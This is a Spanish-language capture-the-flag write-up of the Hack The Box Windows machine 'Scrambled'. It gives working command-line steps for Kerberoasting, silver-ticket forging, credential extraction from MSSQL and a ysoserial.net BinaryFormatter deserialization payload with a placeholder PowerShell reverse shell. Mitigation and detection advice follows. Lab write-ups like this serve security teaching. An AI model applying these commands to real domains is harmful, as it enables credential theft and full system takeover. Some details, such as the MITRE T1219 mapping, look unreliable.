---
machine: Scrambled
os: Windows
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, kerberos, silver-ticket, deserialization]
---

# Scrambled — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, ficha publicable.
> Ficha de referencia basada en documentación pública y writeups técnicos. Sin flags, credenciales ni hashes reales.

## TL;DR

La intranet de Scramble Corp filtra el nombre de `ksimpson` y una política de helpdesk que reinicia contraseñas al nombre de usuario. El dominio tiene NTLM deshabilitado, así que toda la autenticación va por Kerberos. Un PDF en el share `Public` apunta a MSSQL; `sqlsvc` tiene un SPN y se puede Kerberoastear. Su hash permite forjar un **silver ticket** para `MSSQLSvc/dc1.scrm.local:1433` e impersonar a `Administrator`. En la base de datos aparece la credencial de `MiscSvc`; con ella se accede al share `IT` y a `ScrambleClient.exe`/`ScrambleLib.dll`. El cliente usa `BinaryFormatter` en el puerto 4411 y permite deserialización .NET hasta SYSTEM.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
53/tcp    domain
80/tcp    http       Microsoft IIS 10.0
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   http-rpc-epmap
636/tcp   ldapssl
1433/tcp  ms-sql-s   SQL Server 2019
4411/tcp  unknown    SCRAMBLECORP_ORDERS_V1.0.3
5985/tcp  wsman
9389/tcp  adws
```

Dominio `scrm.local`, DC `dc1.scrm.local`. El puerto 4411 responde con una cadena de versión propia; se anota para el análisis posterior.

## Enumeración

La web es una intranet con páginas de soporte y alta de usuarios. Una captura de una consola de helpdesk revela el usuario `ksimpson`; el procedimiento indica que la contraseña se restablece al nombre de usuario. Se prueba la credencial y se accede por Kerberos:

```bash
smbclient.py -k scrm.local/ksimpson:<PASSWORD>@dc1.scrm.local -dc-ip dc1.scrm.local
```

```text
ADMIN$  C$  HR  IPC$  IT  NETLOGON  Public  Sales  SYSVOL
```

`Public` contiene un PDF que menciona una base de datos SQL y credenciales filtradas. `IT` no es accesible todavía.

## Foothold

Con un TGT válido se enumeran SPNs:

```bash
GetUserSPNs.py -k -no-pass -dc-host dc1.scrm.local scrm.local/ksimpson -request
```

`sqlsvc` tiene `MSSQLSvc/dc1.scrm.local:1433`. Se solicita el TGS y se crackea:

```bash
hashcat -m 13100 sqlsvc.txt /usr/share/wordlists/rockyou.txt
```

La contraseña de `sqlsvc` no da acceso directo a MSSQL porque la cuenta está en un grupo `NOACCESS`. El camino es forjar un silver ticket firmado con su hash, con el SPN del servicio y el SID del dominio:

```bash
ticketer.py -nthash <SQLSVC_NTHASH> \
  -domain-sid S-1-5-21-<DOMAIN_SID> -domain scrm.local \
  -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
```

```bash
KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
```

El servicio MSSQL confía en el ticket porque está firmado con la clave de `sqlsvc`; el DC no participa.

## Movimiento lateral

En MSSQL se consulta la tabla de importación de RR. HH.:

```sql
SELECT * FROM ScrambleHR.dbo.UserImport;
```

La tabla contiene el usuario y la contraseña de `MiscSvc`. Con esa cuenta se accede por WinRM y se lee el share `IT`:

```bash
evil-winrm -i dc1.scrm.local -u MiscSvc -p '<PASSWORD>'
```

```powershell
ls C:\shares\IT\Apps\'Sales Order Client'
# ScrambleClient.exe  ScrambleLib.dll
```

## Escalada de privilegios

Se descargan el ejecutable y la DLL y se analizan con dnSpy/ILSpy. El cliente habla con el puerto 4411 usando el protocolo:

```text
SCRAMBLECORP_ORDERS_V1.0.3;
LIST_ORDERS
UPLOAD_ORDER;<BinaryFormatter payload>
```

`ScrambleLib` deserializa el cuerpo de `UPLOAD_ORDER` con `BinaryFormatter`, sin comprobar el tipo. Se genera un payload de `ysoserial.net` para ejecutar un comando y se envía al puerto 4411:

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -o base64 -c 'powershell -e <BASE64_REVERSE_SHELL>'
```

```text
UPLOAD_ORDER;<BASE64_PAYLOAD>
```

El servicio corre como SYSTEM y ejecuta la cadena. La shell resultante es `nt authority\system`.

## Evidencia

- Página de helpdesk con el usuario y la política de contraseñas, sin datos reales.
- SPN de `sqlsvc` y petición TGS.
- Consulta a `UserImport` con la contraseña redactada.
- Cadena de versión del puerto 4411 y `whoami` como SYSTEM.

## Lecciones aprendidas

- Con NTLM deshabilitado, las herramientas deben usar Kerberos y un ccache válido.
- Un silver ticket no requiere comprometer el DC: basta el hash del servicio y su SPN.
- `BinaryFormatter` es peligroso incluso en un protocolo propietario; el tipo del payload no se valida.
- Una tabla de importación de RR. HH. puede contener credenciales de servicio reutilizables.

## Mitigaciones y detección

- **Corrección:** eliminar `BinaryFormatter` y usar un serializador con tipos permitidos; rotar contraseñas de servicio; no almacenar credenciales en tablas de negocio; limitar la exposición de MSSQL; revisar los grupos `NOACCESS` y las ACL.
- **Detección:** peticiones TGS masivas (4769) para cuentas de servicio; silver tickets con tiempos de validez anómalos; accesos a `UserImport`; conexiones al 4411 con cadenas `BinaryFormatter`; procesos hijos de `ScrambleClient.exe`.
- MITRE ATT&CK: T1558.003 (Kerberoasting), T1558.002 (silver ticket), T1059.001 (PowerShell), T1505.003 (web shell no aplica; el servicio propietario es T1219).

## Referencias

- <https://www.hackthebox.com/machines/Scrambled>
- <https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html>
- <https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide>
- <https://attack.mitre.org/techniques/T1558/002/>
